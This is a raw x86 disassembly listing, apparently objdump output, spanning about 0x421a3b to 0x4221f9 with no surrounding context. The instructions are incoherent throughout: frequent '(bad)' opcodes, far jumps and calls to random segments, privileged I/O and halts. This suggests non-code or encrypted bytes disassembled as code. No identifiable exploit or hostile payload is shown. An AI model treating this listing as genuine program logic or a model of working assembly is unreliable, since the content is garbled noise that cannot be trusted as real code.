  421a3b:	pop    ecx
  421a3c:	out    dx,al
  421a3d:	stos   DWORD PTR es:[edi],eax
  421a3e:	push   ss
  421a3f:	cli    
  421a40:	loope  0x421a70
  421a42:	call   0x4272f74f
  421a47:	push   edi
  421a48:	daa    
  421a49:	mov    edi,DWORD PTR [ecx]
  421a4b:	jns    0x421a65
  421a4d:	pop    ebp
  421a4e:	sub    dl,dl
  421a50:	aam    0x46
  421a52:	cmp    DWORD PTR [ecx],esi
  421a54:	and    eax,0x2d2a1eb5
  421a59:	mov    eax,ds:0xad836746
  421a5e:	and    eax,0x3b7719d3
  421a63:	arpl   cx,bx
  421a65:	aad    0xb5
  421a67:	stos   DWORD PTR es:[edi],eax
  421a68:	test   BYTE PTR [eax+edi*8],cl
  421a6b:	xchg   bp,ax
  421a6d:	ret    
  421a6e:	sbb    BYTE PTR [ecx+0x10796095],bl
  421a74:	jmp    0xd717:0xa992c0e5
  421a7b:	(bad)  
  421a7e:	loope  0x421aa5
  421a80:	bound  edi,QWORD PTR [edx-0x4bc4bd61]
  421a86:	mov    esi,0x9548029a
  421a8b:	mov    ah,ah
  421a8d:	dec    esi
  421a8e:	and    BYTE PTR [esi+0x33],0x88
  421a92:	scas   eax,DWORD PTR es:[edi]
  421a93:	hlt    
  421a94:	imul   ecx,DWORD PTR [eax-0x5e98ed07],0x29
  421a9b:	sub    esi,DWORD PTR [ecx]
  421a9d:	xchg   edx,eax
  421a9e:	or     ch,BYTE PTR [edi-0x2e9bfa97]
  421aa4:	sahf   
  421aa5:	pop    ds
  421aa6:	mov    WORD PTR [esi+ebx*1+0xd],?
  421aaa:	inc    eax
  421aab:	push   ds
  421aac:	iret   
  421aad:	xlat   BYTE PTR ds:[ebx]
  421aae:	xor    eax,DWORD PTR [eax+0xb08e668]
  421ab4:	xor    BYTE PTR [edx],0xcd
  421ab7:	lds    ecx,FWORD PTR [ecx]
  421ab9:	dec    esi
  421aba:	xchg   esi,eax
  421abb:	sub    al,0xb5
  421abd:	rcr    DWORD PTR [ebx-0x1b0489cc],cl
  421ac3:	jne    0x421a72
  421ac5:	popf   
  421ac6:	ins    DWORD PTR es:[edi],dx
  421ac7:	inc    ecx
  421ac8:	ficomp DWORD PTR [edi+0x5d]
  421acb:	or     BYTE PTR [edx],ah
  421acd:	dec    edi
  421ace:	fidivr DWORD PTR [esi-0x3]
  421ad1:	mov    bh,0x5a
  421ad3:	or     BYTE PTR [edi+0x5d],dh
  421ad6:	sbb    ah,BYTE PTR [edx+0x406e8679]
  421adc:	js     0x421b2f
  421ade:	add    eax,0x1eba945e
  421ae3:	ins    BYTE PTR es:[edi],dx
  421ae4:	(bad)  
  421ae5:	dec    edi
  421ae6:	adc    DWORD PTR [ecx+edx*2+0x6d],esi
  421aea:	ja     0x421aa1
  421aec:	xor    eax,0x4a818e7e
  421af1:	sub    ch,BYTE PTR [edx]
  421af3:	inc    ebp
  421af4:	mov    al,ds:0xaef45492
  421af9:	and    ch,ch
  421afb:	pop    eax
  421afc:	dec    esi
  421afd:	gs call 0x35ef:0xe3c79258
  421b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b06:	xor    BYTE PTR [ecx],ah
  421b08:	xchg   edx,eax
  421b09:	adc    ah,BYTE PTR [ecx+esi*8+0x2e60caa4]
  421b10:	xor    DWORD PTR [ecx-0x30],eax
  421b13:	shr    bh,1
  421b15:	shr    BYTE PTR [ebp+edi*4+0x28b2a000],1
  421b1c:	fisubr WORD PTR [eax-0x593ec1f9]
  421b22:	add    al,BYTE PTR [ebp+0x2323488]
  421b28:	push   ebp
  421b29:	stos   DWORD PTR es:[edi],eax
  421b2a:	fs out dx,eax
  421b2c:	add    DWORD PTR [edi-0x36],0x7171d2f4
  421b33:	test   BYTE PTR [eax-0x7008877c],bh
  421b39:	das    
  421b3a:	pop    eax
  421b3b:	daa    
  421b3c:	scas   eax,DWORD PTR es:[edi]
  421b3d:	push   edx
  421b3e:	bound  ecx,QWORD PTR [ebx+ebx*2+0x7127b456]
  421b45:	xlat   BYTE PTR ds:[ebx]
  421b46:	out    dx,eax
  421b47:	loope  0x421b8a
  421b49:	iret   
  421b4a:	outs   dx,BYTE PTR ds:[esi]
  421b4b:	stos   BYTE PTR es:[edi],al
  421b4c:	dec    esp
  421b4d:	fistp  WORD PTR [edi-0x6e910e57]
  421b53:	add    DWORD PTR [edi+0x32],0x666991f
  421b5a:	xchg   edx,eax
  421b5b:	sti    
  421b5c:	clc    
  421b5d:	add    bl,BYTE PTR [edx]
  421b5f:	xchg   DWORD PTR [ebx+0x55f0f3ea],edi
  421b65:	int    0xd5
  421b67:	and    eax,0x93afc946
  421b6c:	mov    ecx,0xcf322429
  421b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b73:	jg     0x421b98
  421b75:	stos   BYTE PTR es:[edi],al
  421b76:	lock ror BYTE PTR cs:[ebp-0x4cea706f],cl
  421b7e:	aam    0xc9
  421b80:	div    BYTE PTR [edx-0x18]
  421b83:	dec    ebx
  421b84:	bnd jmp 0xbbd47efe
  421b8a:	imul   esi,DWORD PTR [ebx],0xc28736c2
  421b90:	les    ebx,FWORD PTR [ecx]
  421b92:	stos   DWORD PTR es:[edi],eax
  421b93:	jle    0x421ba5
  421b95:	jecxz  0x421ba6
  421b97:	mov    eax,DWORD PTR [eax+0x43b276b4]
  421b9d:	jo     0x421b77
  421b9f:	popf   
  421ba0:	(bad)  
  421ba1:	ror    BYTE PTR [di+0x17a1],cl
  421ba6:	stos   BYTE PTR es:[edi],al
  421ba7:	mov    ebx,0x78dc8e32
  421bac:	mov    ah,0x69
  421bae:	mov    ch,0x6b
  421bb0:	ja     0x421b97
  421bb2:	push   ss
  421bb3:	mov    eax,0x2a2fd334
  421bb8:	inc    edx
  421bb9:	lahf   
  421bba:	adc    eax,0x6494c814
  421bbf:	xchg   edi,eax
  421bc0:	popf   
  421bc1:	mov    ebx,0x2448c7c1
  421bc6:	int3   
  421bc7:	xchg   ebp,eax
  421bc8:	xor    ebp,edi
  421bca:	ret    
  421bcb:	call   0xcb154bf
  421bd0:	dec    ebx
  421bd1:	(bad)  
  421bd2:	jae    0x421bd5
  421bd4:	lea    ebp,[ebx+0x34]
  421bd7:	aaa    
  421bd8:	adc    dl,BYTE PTR [edi]
  421bda:	addr16 cdq 
  421bdc:	xchg   ecx,eax
  421bdd:	push   0x9
  421bdf:	outs   dx,DWORD PTR ds:[esi]
  421be0:	imul   ebx,DWORD PTR [ecx+edx*4],0xf9a5cfab
  421be7:	ins    DWORD PTR es:[edi],dx
  421be8:	sub    edx,DWORD PTR [ebx]
  421bea:	pop    ebx
  421beb:	xor    eax,0x555d6d97
  421bf0:	jns    0x421c55
  421bf2:	jmp    0x27aa:0x10ac1cd
  421bf9:	call   0xa5f2:0x8cd1c5d7
  421c00:	fiadd  WORD PTR [ebx-0x72]
  421c03:	cwde   
  421c04:	jae    0x421c4d
  421c06:	adc    eax,0xfc1e8ff6
  421c0b:	pop    edx
  421c0c:	repz pop esi
  421c0e:	push   ss
  421c0f:	popa   
  421c10:	add    dl,BYTE PTR [ebx+eiz*2]
  421c13:	fidivr WORD PTR [edx]
  421c15:	mov    ds:0x34c078f5,al
  421c1a:	(bad)  
  421c1b:	out    dx,al
  421c1c:	inc    eax
  421c1d:	jne    0x421c3d
  421c1f:	std    
  421c20:	dec    eax
  421c21:	or     al,0xeb
  421c23:	call   0xdf2:0x67ba8a3c
  421c2a:	fdivr  DWORD PTR ds:0xece6abba
  421c30:	ins    BYTE PTR es:[edi],dx
  421c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c32:	fwait
  421c33:	jecxz  0x421c57
  421c35:	(bad)  
  421c36:	sub    ch,cl
  421c38:	sbb    eax,0xad131e4
  421c3d:	mov    esp,0xf2d9
  421c42:	clc    
  421c43:	mov    ah,0x7f
  421c45:	cmp    eax,0xf5faff7f
  421c4a:	jle    0x421c4e
  421c4c:	xor    eax,DWORD PTR [esi+0x4a]
  421c4f:	jb     0x421cc3
  421c51:	pop    edx
  421c52:	sbb    dl,BYTE PTR [ecx+0x3260001]
  421c58:	add    BYTE PTR [eax],al
  421c5a:	enter  0xcaed,0xa
  421c5e:	mov    edi,0x7b133aad
  421c63:	mov    eax,0x58c70d0f
  421c68:	mov    edx,0x819b7683
  421c6d:	mov    esi,0xaa61bde8
  421c72:	and    esi,ecx
  421c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c75:	hlt    
  421c76:	sub    ebx,ebp
  421c78:	gs loop 0x421c34
  421c7b:	stc    
  421c7c:	mov    BYTE PTR [esi+0x3b547572],bh
  421c82:	fisubr WORD PTR [ecx]
  421c84:	add    eax,0x1e102baf
  421c89:	dec    edx
  421c8a:	adc    al,al
  421c8c:	and    al,0x98
  421c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c8f:	fsubr  QWORD PTR [ecx]
  421c91:	lds    ebx,FWORD PTR [esi]
  421c93:	adc    eax,0x47cfbf76
  421c98:	add    DWORD PTR [ebp-0x4c80d3c9],esi
  421c9e:	call   0x73c492ef
  421ca3:	pop    ecx
  421ca4:	fisub  DWORD PTR [edi+0xe]
  421ca7:	mov    bh,0xd7
  421ca9:	sub    esi,DWORD PTR [edx]
  421cab:	add    dh,BYTE PTR [eax-0x25]
  421cae:	dec    esp
  421caf:	mov    bh,0xf5
  421cb1:	or     DWORD PTR [esi],edi
  421cb3:	jmp    0xb089:0x130084c1
  421cba:	adc    ebx,ebp
  421cbc:	jnp    0x421c6d
  421cbe:	test   al,0x93
  421cc0:	xchg   esp,eax
  421cc1:	jns    0x421cdc
  421cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cc4:	mov    cs,WORD PTR [esp+ebx*4+0x766179b2]
  421ccb:	jno    0x421d38
  421ccd:	std    
  421cce:	mov    al,ds:0xd9f3a3c8
  421cd3:	add    BYTE PTR [edx+0x15ad57ac],dl
  421cd9:	in     eax,dx
  421cda:	jecxz  0x421ceb
  421cdc:	jae    0x421d22
  421cde:	and    BYTE PTR [ebx],0x7f
  421ce1:	push   cs
  421ce2:	rcl    DWORD PTR [edi],cl
  421ce4:	dec    edi
  421ce5:	ror    BYTE PTR [edx-0x5f],1
  421ce8:	retf   0x28b
  421ceb:	daa    
  421cec:	push   0x74
  421cee:	mov    ecx,0x10744ab1
  421cf3:	jb     0x421d0d
  421cf5:	js     0x421ce8
  421cf7:	loope  0x421cde
  421cf9:	pop    ds
  421cfa:	mov    ebx,0x22d2f714
  421cff:	adc    al,0x35
  421d01:	jae    0x421d53
  421d03:	cmp    al,0xa
  421d05:	into   
  421d06:	imul   edx,DWORD PTR [edx],0xffffffcc
  421d09:	xor    DWORD PTR [esi+0x2],ecx
  421d0c:	mov    ax,fs:0x8e007a5f
  421d13:	iret   
  421d14:	push   0xffffff9d
  421d16:	inc    esi
  421d17:	loope  0x421d2e
  421d19:	jmp    0x421d7c
  421d1b:	mov    ds:0x8a089407,al
  421d20:	hlt    
  421d21:	sbb    eax,0x44b5c059
  421d26:	sbb    al,dl
  421d28:	cld    
  421d29:	and    DWORD PTR [edx-0x2671df1f],edi
  421d2f:	nop
  421d30:	lods   al,BYTE PTR ds:[esi]
  421d32:	jmp    0x60a3835d
  421d37:	outs   dx,DWORD PTR ds:[esi]
  421d38:	gs jg  0x421cd0
  421d3b:	dec    ebx
  421d3c:	xor    al,0x6
  421d3e:	inc    edi
  421d3f:	sbb    BYTE PTR [eax-0x65317c21],dh
  421d45:	inc    ebp
  421d46:	je     0x421da4
  421d48:	pop    edx
  421d49:	repz xchg ebp,eax
  421d4b:	lods   al,BYTE PTR ds:[esi]
  421d4c:	ror    BYTE PTR [ebx-0x15],0x53
  421d50:	outs   dx,DWORD PTR ds:[esi]
  421d51:	jmp    0xe99a537c
  421d56:	xor    BYTE PTR [ebp+eax*8-0x40],dl
  421d5a:	inc    DWORD PTR [edx+0x6f]
  421d5d:	sub    al,0xb8
  421d5f:	jp     0x421d37
  421d61:	jg     0x421d0f
  421d63:	cli    
  421d64:	test   cl,ah
  421d66:	out    0xa5,al
  421d68:	mul    DWORD PTR [edi+0x33]
  421d6b:	inc    esi
  421d6c:	push   ds
  421d6d:	stc    
  421d6e:	and    ch,BYTE PTR [ebx+0x4c55d457]
  421d74:	push   ds
  421d75:	rol    edx,0x99
  421d78:	sub    BYTE PTR [edi-0x29],dh
  421d7b:	or     cl,BYTE PTR [edx]
  421d7d:	out    0x5f,eax
  421d7f:	push   0xffffffe0
  421d81:	and    eax,eax
  421d83:	mov    ds:0x22d4321,eax
  421d88:	stos   DWORD PTR es:[edi],eax
  421d89:	mov    cl,0xfc
  421d8b:	push   esp
  421d8c:	int3   
  421d8d:	pop    eax
  421d8e:	(bad)  
  421d8f:	add    BYTE PTR ds:0x577e76b1,bh
  421d95:	loope  0x421d8e
  421d97:	pop    ebx
  421d98:	add    eax,0xf20abfd8
  421d9d:	inc    ebx
  421d9e:	jne    0x421d6d
  421da0:	loop   0x421da7
  421da2:	dec    ebp
  421da3:	sub    ebx,ecx
  421da5:	fisub  DWORD PTR [esi]
  421da7:	(bad)  
  421da8:	mov    edi,DWORD PTR [eax]
  421daa:	retf   0x5935
  421dad:	xchg   edx,eax
  421dae:	sub    DWORD PTR [edi-0x1b236352],0xffffff8e
  421db5:	mov    bl,0x63
  421db7:	fist   DWORD PTR [ebx-0x5]
  421dba:	jns    0x421d44
  421dbc:	or     BYTE PTR [eax],0xc
  421dbf:	mov    edx,gs
  421dc1:	cmp    ebx,ebx
  421dc3:	(bad)  [esi-0x75]
  421dc6:	call   0xca2c:0xc2bbf263
  421dcd:	pop    ebx
  421dce:	push   esp
  421dcf:	iret   
  421dd0:	cmp    al,0xc1
  421dd2:	sahf   
  421dd3:	test   bl,dh
  421dd5:	cwde   
  421dd6:	sbb    ebx,edx
  421dd8:	ja     0x421daa
  421dda:	out    dx,al
  421ddb:	fnstcw WORD PTR [edx+ebx*4+0x3008b6a1]
  421de2:	pop    eax
  421de3:	xchg   ebp,eax
  421de4:	jb     0x421e36
  421de6:	ds sti 
  421de8:	aad    0x9e
  421dea:	je     0x421e56
  421dec:	sub    al,0xa7
  421dee:	and    eax,0x7cc0df1f
  421df3:	push   eax
  421df4:	loop   0x421d7b
  421df6:	sahf   
  421df7:	push   ebp
  421df8:	mov    dh,0xb8
  421dfa:	inc    eax
  421dfb:	int    0xcc
  421dfd:	xchg   BYTE PTR [esi+0x56],bh
  421e00:	pop    es
  421e01:	in     al,0xc3
  421e03:	(bad)  [ebx-0x33b3e3e2]
  421e09:	adc    al,0x2f
  421e0b:	mov    edi,0x71c73fb8
  421e10:	sti    
  421e11:	push   esi
  421e12:	cmc    
  421e13:	ins    BYTE PTR es:[di],dx
  421e15:	push   esi
  421e16:	xlat   BYTE PTR ds:[ebx]
  421e17:	mov    ds:0x5bdf84b5,eax
  421e1c:	mov    ebp,DWORD PTR [edx]
  421e1e:	push   ss
  421e1f:	sub    al,BYTE PTR [esi]
  421e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e22:	in     al,0xa0
  421e24:	(bad)  [edx]
  421e26:	aas    
  421e27:	fwait
  421e28:	xchg   ebp,eax
  421e29:	sbb    al,0x7e
  421e2b:	or     DWORD PTR [eax],0x3c
  421e2e:	mov    esp,DWORD PTR [ebp-0x1b82f875]
  421e34:	arpl   WORD PTR es:[ebx+0x61],si
  421e38:	(bad)  
  421e39:	mov    ch,0xf0
  421e3b:	pop    ebp
  421e3c:	xor    al,cl
  421e3e:	aaa    
  421e3f:	cwde   
  421e40:	fwait
  421e41:	mov    eax,ds:0xc80dfe54
  421e46:	leave  
  421e47:	mov    ds:0xee9ad8fc,al
  421e4c:	dec    eax
  421e4d:	(bad)  
  421e4e:	neg    ecx
  421e50:	push   cs
  421e51:	pop    ss
  421e52:	ds retf 0x6dfc
  421e56:	sbb    ebp,esi
  421e58:	mov    cl,0xb8
  421e5a:	dec    edx
  421e5b:	jmp    0x421ec2
  421e5d:	in     al,dx
  421e5e:	xor    ebp,DWORD PTR [ebx]
  421e60:	xchg   ecx,eax
  421e61:	xchg   esi,eax
  421e62:	into   
  421e63:	sub    al,0xdd
  421e65:	mov    ebp,0xc6d5c78d
  421e6a:	push   ss
  421e6b:	pop    eax
  421e6c:	push   cs
  421e6d:	xor    esi,ebp
  421e6f:	stos   DWORD PTR es:[edi],eax
  421e70:	das    
  421e71:	cli    
  421e72:	or     al,0x2a
  421e74:	xor    al,0x24
  421e76:	jae    0x421e4e
  421e78:	xchg   esi,eax
  421e79:	cmp    eax,0x970344d8
  421e7e:	lea    edi,[edi+edx*1]
  421e81:	shl    DWORD PTR [ecx+eax*8+0x60],1
  421e85:	js     0x421edf
  421e87:	mov    bl,0xec
  421e89:	pop    ebp
  421e8a:	daa    
  421e8b:	sti    
  421e8c:	xchg   BYTE PTR [ecx],al
  421e8e:	aaa    
  421e8f:	dec    edx
  421e90:	cmp    edx,edi
  421e92:	mov    BYTE PTR [edx+0x1557c3e5],0x54
  421e99:	ja     0x421e4e
  421e9b:	push   esi
  421e9c:	ss adc edi,esi
  421e9f:	std    
  421ea0:	in     al,dx
  421ea1:	add    esp,eax
  421ea3:	xchg   edi,eax
  421ea4:	adc    DWORD PTR [esi+0x4349a063],0xc
  421eab:	push   ss
  421eac:	imul   esp,ecx,0xb60611f8
  421eb2:	aam    0x79
  421eb4:	or     esp,ebp
  421eb6:	dec    esi
  421eb7:	dec    esp
  421eb8:	push   esp
  421eb9:	scas   eax,DWORD PTR es:[edi]
  421eba:	fwait
  421ebb:	retf   0x5e8a
  421ebe:	mov    ds:0x624f69c0,al
  421ec3:	push   ss
  421ec4:	loopne 0x421ee2
  421ec6:	daa    
  421ec7:	cmp    BYTE PTR [edi],ah
  421ec9:	mov    ds,WORD PTR ds:0x99812543
  421ecf:	inc    esp
  421ed0:	xchg   ebp,eax
  421ed1:	jb     0x421e7d
  421ed3:	mov    eax,0xb6de9d5
  421ed8:	mov    edi,0x24a815cd
  421edd:	cmp    eax,0x74d2ff6b
  421ee2:	cli    
  421ee3:	dec    esp
  421ee4:	test   eax,0x5e6ce37a
  421ee9:	mov    al,dh
  421eeb:	xchg   ebp,eax
  421eec:	je     0x421ec4
  421eee:	and    eax,0x1281ae29
  421ef3:	arpl   si,sp
  421ef5:	sbb    al,0x65
  421ef7:	or     BYTE PTR [ecx-0x5d],ch
  421efa:	and    eax,0xb5211729
  421eff:	dec    ebx
  421f00:	lock xor eax,0x4208c65a
  421f06:	mov    BYTE PTR cs:[edi+0x0],ch
  421f0a:	ins    BYTE PTR es:[edi],dx
  421f0b:	sub    al,al
  421f0d:	cmp    cl,BYTE PTR [eax]
  421f0f:	inc    ebp
  421f10:	or     dh,ch
  421f12:	add    cl,BYTE PTR [ecx+0x72]
  421f15:	adc    DWORD PTR [ebx+0x3e79a5d2],ebx
  421f1b:	dec    edx
  421f1c:	mul    DWORD PTR [eax-0x37b616]
  421f22:	test   DWORD PTR [ebp-0x1fd3660f],edx
  421f28:	push   esi
  421f29:	ja     0x421f9d
  421f2b:	jb     0x421f33
  421f2d:	mov    bl,0x87
  421f2f:	scas   eax,DWORD PTR es:[edi]
  421f30:	jne    0x421f59
  421f32:	retf   
  421f33:	or     eax,0x792ecbd0
  421f38:	cli    
  421f39:	(bad)  
  421f3a:	cdq    
  421f3b:	mov    eax,ds:0x7548f8e4
  421f40:	int    0xdc
  421f42:	mov    bl,BYTE PTR [eax]
  421f44:	mov    ?,WORD PTR [ecx-0x1f63a3d0]
  421f4a:	loop   0x421fa1
  421f4c:	mov    bl,0x36
  421f4e:	ds and eax,0xf152057c
  421f54:	cmp    BYTE PTR [ebx+edx*1],al
  421f57:	jne    0x421f28
  421f59:	or     dh,BYTE PTR [edx+0xdc9fa0e]
  421f5f:	adc    al,0x4e
  421f61:	fwait
  421f62:	daa    
  421f63:	(bad)  
  421f64:	xchg   ecx,eax
  421f65:	sub    eax,0xedde5d31
  421f6a:	adc    cl,BYTE PTR [edi-0x54]
  421f6d:	out    dx,al
  421f6e:	fninit 
  421f70:	mov    eax,ds:0xfe4f6e61
  421f75:	aam    0xf8
  421f77:	inc    ebx
  421f78:	push   esp
  421f79:	jecxz  0x421fef
  421f7b:	xchg   esp,eax
  421f7c:	dec    edx
  421f7d:	mov    ch,0xcf
  421f7f:	jmp    0xe789:0x1c390000
  421f86:	lods   eax,DWORD PTR ds:[esi]
  421f87:	idiv   DWORD PTR [edi-0x22]
  421f8a:	mov    DWORD PTR [edx+0x79],ebp
  421f8d:	adc    DWORD PTR [ebp+0x3e],0x9440417c
  421f94:	add    DWORD PTR [eax],eax
  421f96:	add    eax,DWORD PTR es:[eax]
  421f99:	add    BYTE PTR [edi+0x2e],bl
  421f9c:	lock test DWORD PTR [eax-0x28],edi
  421fa0:	add    al,0xc3
  421fa2:	mov    ebx,0x1c262d77
  421fa7:	lea    ebp,[edi+0x20095eef]
  421fad:	mov    bh,0x3f
  421faf:	mov    ebx,0x28be6da8
  421fb4:	(bad)  
  421fb5:	scas   eax,DWORD PTR es:[edi]
  421fb6:	dec    edx
  421fb7:	xor    cl,bh
  421fb9:	push   ds
  421fba:	(bad)  ds:0xb3a53e7b
  421fc0:	fwait
  421fc1:	mov    ds:0xf921c4f6,eax
  421fc6:	test   al,0x83
  421fc8:	xor    DWORD PTR [esi],eax
  421fca:	in     eax,0x23
  421fcc:	bound  esi,QWORD PTR [ecx]
  421fce:	aad    0x18
  421fd0:	js     0x421ff5
  421fd2:	xchg   ebx,eax
  421fd3:	aas    
  421fd4:	ja     0x421ff0
  421fd6:	sub    eax,0x4168da67
  421fdb:	sbb    eax,0x5adb22d8
  421fe0:	jl     0x421fec
  421fe2:	dec    esp
  421fe3:	comiss xmm0,DWORD PTR [ecx-0x5528a2f5]
  421fea:	cmp    BYTE PTR [eax-0x175d6a37],cl
  421ff0:	sbb    BYTE PTR [ebx+0x6e],0xc8
  421ff4:	sbb    eax,0x9f4d0d42
  421ff9:	sub    al,0x74
  421ffb:	clc    
  421ffc:	mov    edi,0x73d16ee0
  422001:	aad    0xcb
  422003:	lea    ebx,[eax]
  422005:	xor    esp,DWORD PTR [esi-0x1b]
  422008:	fidiv  DWORD PTR [edx-0x5d]
  42200b:	cwde   
  42200c:	xchg   ch,dl
  42200e:	sbb    bh,cl
  422010:	sub    eax,0x18fe9f71
  422015:	jae    0x422085
  422017:	(bad)  
  422018:	adc    ah,BYTE PTR [ebx+ebx*4+0x3d]
  42201c:	jb     0x42201e
  42201e:	pop    ss
  42201f:	fmul   QWORD PTR [esi]
  422021:	aad    0x88
  422023:	mov    bl,0xa0
  422025:	sub    BYTE PTR [ecx*4-0x1225fc83],dl
  42202c:	dec    esi
  42202d:	into   
  42202e:	jge    0x42205f
  422030:	into   
  422031:	stos   DWORD PTR es:[edi],eax
  422032:	and    eax,0x1477b7a9
  422037:	xchg   ebp,eax
  422038:	lahf   
  422039:	cmp    eax,0x9f9d8d0
  42203e:	mov    dl,0xa7
  422040:	mov    dl,bl
  422042:	(bad)  
  422043:	stc    
  422044:	adc    bh,BYTE PTR [ebx+ebx*8+0x23863f6]
  42204b:	nop
  42204c:	xor    cl,ah
  42204e:	pusha  
  42204f:	xor    al,bh
  422051:	xor    ebx,DWORD PTR [ebp-0x19fe4bc1]
  422057:	cmp    al,0xe6
  422059:	mov    bh,bh
  42205b:	pop    edx
  42205c:	xor    DWORD PTR [eax+ebx*8],0x3e
  422060:	in     eax,dx
  422061:	loopne 0x4220cf
  422063:	cdq    
  422064:	mov    ds:0x2db09c07,al
  422069:	or     al,0xc1
  42206b:	push   ss
  42206c:	xchg   ecx,eax
  42206d:	popf   
  42206e:	ins    DWORD PTR es:[edi],dx
  42206f:	mov    esi,0x634dd2c0
  422074:	mov    dl,0x5e
  422076:	or     eax,0xfebd63d1
  42207b:	stos   DWORD PTR es:[edi],eax
  42207c:	sub    DWORD PTR [ecx+0x48ea29e5],edi
  422082:	jb     0x422006
  422084:	cmp    ah,bh
  422086:	out    0x62,eax
  422088:	rcr    DWORD PTR [eax],cl
  42208a:	jae    0x422034
  42208c:	add    DWORD PTR [edx-0xb6c1bba],edi
  422092:	or     al,0x33
  422094:	inc    edi
  422095:	iret   
  422096:	mov    ah,0x6b
  422098:	popa   
  422099:	cmp    al,0x8c
  42209b:	xchg   BYTE PTR [edi],bl
  42209d:	clc    
  42209e:	ror    DWORD PTR ds:0xcd30c8a7,0xb3
  4220a5:	mov    esi,0x603e43e7
  4220aa:	dec    ebx
  4220ab:	jne    0x422087
  4220ad:	jmp    0x24acdb81
  4220b2:	lock push cs
  4220b4:	dec    edi
  4220b5:	mov    bl,0x13
  4220b7:	jb     0x4220bd
  4220b9:	scas   eax,DWORD PTR es:[edi]
  4220ba:	push   ecx
  4220bb:	hlt    
  4220bc:	iret   
  4220bd:	push   ebp
  4220be:	add    bh,BYTE PTR [eax+0x53]
  4220c1:	pop    esp
  4220c2:	xchg   esp,eax
  4220c3:	cmp    DWORD PTR [ecx],ecx
  4220c5:	lods   al,BYTE PTR ds:[esi]
  4220c6:	mov    al,ds:0x272d6e1a
  4220cb:	ds inc ebp
  4220cd:	fbld   TBYTE PTR [edx]
  4220cf:	ins    BYTE PTR es:[edi],dx
  4220d0:	rcr    edi,1
  4220d2:	jo     0x422059
  4220d4:	ds aam 0x70
  4220d7:	mov    ch,0xc0
  4220d9:	ret    
  4220da:	movsx  edi,BYTE PTR [edx-0x6cf86ae8]
  4220e1:	shl    edx,cl
  4220e3:	sbb    eax,0xa0a563c9
  4220e8:	pop    esi
  4220e9:	cld    
  4220ea:	in     al,dx
  4220eb:	es push 0x2dba0f22
  4220f1:	ret    
  4220f2:	test   BYTE PTR [edi+0x11427f26],cl
  4220f8:	add    DWORD PTR [ecx],esp
  4220fa:	inc    esp
  4220fb:	pop    ebp
  4220fc:	xor    al,0xbe
  4220fe:	rcr    BYTE PTR [ecx+edx*8-0x43f1650e],cl
  422105:	jge    0x42211f
  422107:	aam    0xe6
  422109:	icebp  
  42210a:	adc    ebx,DWORD PTR [ebx-0x77fc043]
  422110:	cmp    al,0xf8
  422112:	and    ebx,DWORD PTR [edi*1+0x280db5c0]
  422119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211a:	jmp    0x7e32:0x1dca3b2
  422121:	out    0x74,al
  422123:	ret    0x2eee
  422126:	mov    al,ds:0x4bc711eb
  42212b:	adc    al,0x3a
  42212d:	pop    esp
  42212e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42212f:	cli    
  422130:	cmc    
  422131:	rcl    DWORD PTR [eax],cl
  422133:	sbb    al,BYTE PTR [edx]
  422135:	data16 data16 mov dl,0xb
  422139:	leave  
  42213a:	or     BYTE PTR [ecx-0x1c],dl
  42213d:	xlat   BYTE PTR ds:[ebx]
  42213e:	unpckhps xmm4,XMMWORD PTR [esi-0x15fc10df]
  422145:	sbb    bh,al
  422147:	xchg   esi,eax
  422148:	jg     0x422159
  42214a:	xchg   edx,eax
  42214b:	in     al,0xd3
  42214d:	int    0xcf
  42214f:	repnz pop ds
  422151:	jg     0x422131
  422153:	lock jmp 0x76e6:0x8c45c328
  42215b:	pop    ecx
  42215c:	or     cl,BYTE PTR [edi-0x56]
  42215f:	or     edx,DWORD PTR [ebx+0x34]
  422162:	sar    ecx,cl
  422164:	jno    0x422100
  422166:	cmc    
  422167:	mov    edx,0xbd18700a
  42216c:	add    eax,0xadabac70
  422171:	jg     0x422164
  422173:	xchg   DWORD PTR [edx-0x243f8f7b],ebp
  422179:	sub    al,0xbc
  42217b:	shl    esp,cl
  42217d:	fdiv   QWORD PTR [ecx-0x4f4cf7e9]
  422183:	ret    
  422184:	xor    BYTE PTR [eax+0x6b],0x26
  422188:	xor    ah,bl
  42218a:	jmp    0x7e89:0x61ac1cde
  422191:	out    dx,al
  422192:	icebp  
  422193:	cmp    esi,DWORD PTR [ecx+0x3bf2eea7]
  422199:	pop    ecx
  42219a:	call   0x6810:0xe490823c
  4221a1:	mov    ah,0xc1
  4221a3:	aad    0x9a
  4221a5:	aaa    
  4221a6:	adc    BYTE PTR [ebp+esi*1-0x70],0xf7
  4221ab:	rcr    BYTE PTR [edx+0x35],1
  4221ae:	hlt    
  4221af:	mov    WORD PTR [edx+0x75],ss
  4221b2:	cli    
  4221b3:	dec    ebp
  4221b4:	data16 or al,0x40
  4221b7:	loop   0x4221ef
  4221b9:	icebp  
  4221ba:	pop    ss
  4221bb:	push   es
  4221bc:	addr16 push es
  4221be:	add    dl,BYTE PTR [edx+0xc82e9e9]
  4221c4:	and    BYTE PTR [ebx-0x2879ee56],dl
  4221ca:	cli    
  4221cb:	sti    
  4221cc:	and    edx,esi
  4221ce:	pop    eax
  4221cf:	xor    eax,0x630eded3
  4221d4:	or     ebx,ebx
  4221d6:	ins    BYTE PTR es:[edi],dx
  4221d7:	es inc ebx
  4221d9:	data16 lahf 
  4221db:	xchg   DWORD PTR [edi],ebp
  4221dd:	bound  esp,QWORD PTR [ecx]
  4221df:	fcom   DWORD PTR [ebx-0x79]
  4221e2:	scas   eax,DWORD PTR es:[edi]
  4221e3:	mov    ch,0xe0
  4221e5:	jmp    0x681039ca
  4221ea:	repnz outs dx,BYTE PTR ds:[esi]
  4221ec:	jmp    0x42221b
  4221ee:	and    BYTE PTR [edi+0x409d8397],0x93
  4221f5:	pop    ebx
  4221f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221f7:	in     eax,0xc2
  4221f9:	lock add BYTE PTR [edx],ch
